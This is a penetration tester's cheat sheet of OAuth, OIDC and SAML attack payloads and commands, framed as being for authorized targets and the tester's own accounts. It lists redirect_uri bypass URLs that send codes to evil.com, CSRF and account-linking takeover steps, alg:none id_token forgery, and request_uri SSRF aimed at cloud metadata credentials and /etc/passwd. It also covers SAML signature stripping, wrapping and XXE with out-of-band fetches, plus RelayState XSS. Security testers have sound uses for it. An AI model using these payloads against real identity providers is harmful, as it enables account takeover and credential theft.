# OAuth / OIDC / SAML — Attack Arsenal

**Author:** x8bitranjit
Payloads and tool commands for the guide. Authorized targets only. Two **own** test accounts (attacker + victim).

---

## 0. Recon — pull the whole flow

```bash
# OIDC discovery (endpoints, supported response types, PKCE, scopes, jwks):
curl -s https://IDP/.well-known/openid-configuration | jq .
curl -s https://IDP/.well-known/oauth-authorization-server | jq .   # RFC 8414 alt
curl -s $(curl -s https://IDP/.well-known/openid-configuration | jq -r .jwks_uri) | jq .   # signing keys

# Find the flow in the app: grep JS/HTML for these
#   client_id=  redirect_uri=  response_type=  /authorize  /oauth  /saml  SAMLRequest  RelayState
# Decode a SAML blob (redirect binding is DEFLATE+base64; POST binding is plain base64):
echo "$SAMLRESPONSE" | base64 -d | python3 -c "import sys,zlib; d=sys.stdin.buffer.read();
import xml.dom.minidom as m;
try: print(m.parseString(zlib.decompress(d,-15)).toprettyxml())
except: print(m.parseString(d).toprettyxml())"
```

Note the authorization request params: `client_id, redirect_uri, response_type, response_mode, scope, state, nonce, code_challenge, code_challenge_method, prompt`.

---

## 1. `redirect_uri` bypass payloads

Legit = `https://app.example.com/callback`. Swap `redirect_uri` to each:

```
https://app.example.com.evil.com/callback          # suffix (not anchored)
https://evil.com/?x=app.example.com/callback         # substring
https://evilapp.example.com/callback                 # loose subdomain/wildcard
https://app.example.com@evil.com/callback            # @ userinfo → host=evil.com
https://evil.com#app.example.com/callback            # fragment
https://evil.com\@app.example.com/callback           # backslash parser diff
https://evil.com%2f%2e%2eapp.example.com/            # encoded traversal
https://app.example.com%2523@evil.com/               # double-encoding
https://app.example.com/callback/../redirect?url=https://evil.com   # path traversal → open redirect
https://app.example.com/callback/%2e%2e/oauth/echo   # reach a reflecting endpoint on allowed host
http://localhost:1337/                               # localhost listener
https://127.0.0.1:1337/
javascript://app.example.com/%0aalert(document.domain)   # scheme abuse (rarely honored, always try)
data:text/html;base64,PHNjcmlwdD4uLi48L3NjcmlwdD4=
(empty value)                                        # fallback-to-registered / reflect
```

**Parameter pollution (send two — validator vs issuer differential):**
```
GET /authorize?client_id=X&redirect_uri=https://app.example.com/callback&redirect_uri=https://evil.com/&response_type=code&...
GET /authorize?...&redirect_uri=https://app.example.com/callback%26redirect_uri=https://evil.com
```

**Exfil sinks (once code/token lands where you can read it):**
- Referer leak: callback loads a 3rd-party resource before stripping `?code=`.
- Open redirect on allowed host preserving `?code=`/`#access_token=`.
- Implicit `#access_token=` → any redirect that keeps the fragment.
- `response_mode=web_message` postMessage listener missing `origin` check.

---

## 2. `state` / CSRF tests

```
# 1) omit state on request AND callback — still logs in?  → CSRF
GET /authorize?client_id=X&redirect_uri=...&response_type=code            (no state)
GET /callback?code=AAA                                                    (no state)

# 2) constant / cross-user
GET /callback?code=AAA&state=x
GET /callback?code=<userA_code>&state=<userA_state>   in userB session

# 3) account-linking CSRF (silent ATO) — capture YOUR OWN code from the "link" flow, don't complete it:
#    send victim (logged into their acct) this pre-baked callback:
https://app.example.com/social/callback?code=<ATTACKER_CODE>&state=<if_any>
#    → their account links to YOUR identity → you log in via social → you're in their account.
```

## 3. Authorization-code / PKCE

```bash
# code replay — redeem twice:
curl -s -X POST https://IDP/oauth/token -d grant_type=authorization_code \
  -d code=$CODE -d redirect_uri=$RU -d client_id=$CID          # then repeat — second one issues tokens? = replay

# redirect_uri mismatch at /token (must match /authorize per RFC 9700):
curl ... -d code=$CODE -d redirect_uri=https://evil.com/ -d client_id=$CID   # accepted? = gap
curl ... -d code=$CODE -d client_id=$CID                                     # omit redirect_uri entirely

# PKCE downgrade / omission (public client):
#   at /authorize omit code_challenge, or set code_challenge_method=plain
curl ... -d code=$CODE -d client_id=$CID                        # no code_verifier — tokens issued? = PKCE optional
curl ... -d code=$CODE -d client_id=$CID -d code_verifier=anything   # wrong verifier accepted? = not checked
```

## 4. `response_type` / `response_mode` switching

```
response_type=code       → token            # downgrade to implicit (token in #fragment)
response_type=code       → id_token token
response_mode=form_post   → query            # move credential to query (leakier)
response_mode=web_message                    # postMessage — test listener origin check with prompt=none (silent)
prompt=none                                  # silent auth — new scopes granted without consent?
```

## 5. Scope

```
scope=openid profile email  →  ... offline_access admin read:all   # escalation / refresh-token grant
```

## 6. OIDC id_token forgery (JWT — full detail in ../JWT/)

```bash
# alg:none  (strip signature)
python3 ../JWT/poc/jwt_tamper.py --token "$IDTOKEN" --alg none --set email=victim@target.com --set email_verified=true
# aud/iss confusion — present an id_token minted for a client you control:
#   change nothing but reuse it at THIS SP; if aud not pinned to this client_id → accepted
# kid / jku injection → attacker JWKS (see ../JWT/JWT_TESTING_GUIDE.md §jku/kid)
```
Then submit the forged id_token wherever the SP consumes it (callback body, `id_token` param, hybrid flow).

## 7. `request_uri` / JAR SSRF (from the IdP)

```
GET /authorize?client_id=X&request_uri=http://169.254.169.254/latest/meta-data/iam/security-credentials/
GET /authorize?client_id=X&request_uri=http://YOUR-OOB/collab            # confirm server-side fetch
GET /authorize?client_id=X&request_uri=file:///etc/passwd
```
Escalate metadata → IAM creds per **../SSRF/SSRF_TESTING_GUIDE.md**.

## 8. Account-linking / pre-account-takeover (own test accounts)

```
1. Attacker registers victim@test-you-own.com  via PASSWORD (or weak social) BEFORE victim.
2. Victim "Sign in with Google/OIDC" as victim@test-you-own.com.
3. SP merges by email → shared account, attacker password persists → ATO.
Check: does SP honor email_verified:false ? does it link without email re-verification ?
```

---

## 9. SAML payloads

### Decode / re-encode
```bash
# decode (POST binding = base64; redirect binding = base64 + raw-DEFLATE)
saml_decode(){ echo "$1" | base64 -d 2>/dev/null | { python3 -c "import sys,zlib;print(zlib.decompress(sys.stdin.buffer.read(),-15).decode())" 2>/dev/null || echo "$1" | base64 -d; }; }
# re-encode for POST binding
cat forged.xml | base64 -w0
```

### Signature exclusion / stripping
```xml
<!-- remove the entire <ds:Signature> block, set NameID to victim, resubmit -->
<saml:NameID Format="...emailAddress">admin@target.com</saml:NameID>
```

### Comment / canonicalization injection
```xml
<saml:NameID>admin@target.com<!---->.evil.com</saml:NameID>
<saml:NameID>admin@target.com<!--x-->evil</saml:NameID>
```

### XSW (all 8) — use SAML Raider (Burp), or poc/saml_xsw.py to scaffold
```
XSW1/2 : forged Response/Assertion as sibling; signature refs original, app reads forged
XSW3/4 : forged Assertion sibling of signed Assertion (before/after)
XSW5/6 : copy signature into forged assertion / relocate original
XSW7/8 : hide original signed assertion in Extensions/wrapper; app reads injected
```

### XXE in SAML (see ../XXE/)
```xml
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<samlp:Response ...><saml:Assertion>...<saml:NameID>&xxe;</saml:NameID>...
<!-- blind OOB: <!ENTITY % x SYSTEM "http://YOUR-OOB/e.dtd"> %x; -->
```

### Replay / binding
```
- resubmit a captured SAMLResponse in a fresh session / after logout  → accepted? = replay
- strip/skip InResponseTo (IdP-initiated) ; change Recipient/Destination/Audience to another SP
- RelayState = https://evil.com   (open redirect)   |   RelayState = "><script>...  (XSS)
```

### Cert faking / key confusion
```
Re-sign the full assertion with YOUR key, replace <ds:X509Certificate> with YOUR cert.
If SP validates against the embedded cert instead of a pinned IdP cert → total forge.
```

---

## 10. Tools

| Tool | Use |
|------|-----|
| **Burp Suite** + **SAML Raider** | Intercept flows; SAML Raider auto-applies all 8 XSW + cert/sig edits + re-sign |
| **Burp** built-in / **EsPReSSO** ext | Decodes/edits SAML & JOSE/OAuth params inline |
| **jwt_tool** / `../JWT/poc/` | id_token forgery (alg:none, kid/jku, key confusion) |
| **oidc discovery** (`curl`) | endpoints, PKCE support, scopes, jwks |
| **Interactsh / your OOB** | `request_uri` SSRF, blind SAML XXE, code/token exfil listener |
| `poc/oauth_redirect_fuzz.py` | enumerate `redirect_uri` bypasses against `/authorize` |
| `poc/oauth_flow_audit.py` | passive audit: missing state/PKCE/nonce, response_type switching, discovery hygiene |
| `poc/saml_xsw.py` | scaffold XSW1–8 + signature-strip + comment-injection variants from a captured Response |
| `poc/idtoken_tamper.py` | craft `alg:none` / claim-swapped id_tokens for aud/iss/email tests |
| **saml2-based `xmlsec1`** | manual re-sign / verify to understand what the SP checks |
| **mitmproxy** | when Burp CA pinning is a pain (mobile SSO) |

> One benign proof per finding: log in as **your own** test victim, or land **one** exfil request on your listener, then STOP. Tear down OOB servers; delete seeded accounts.
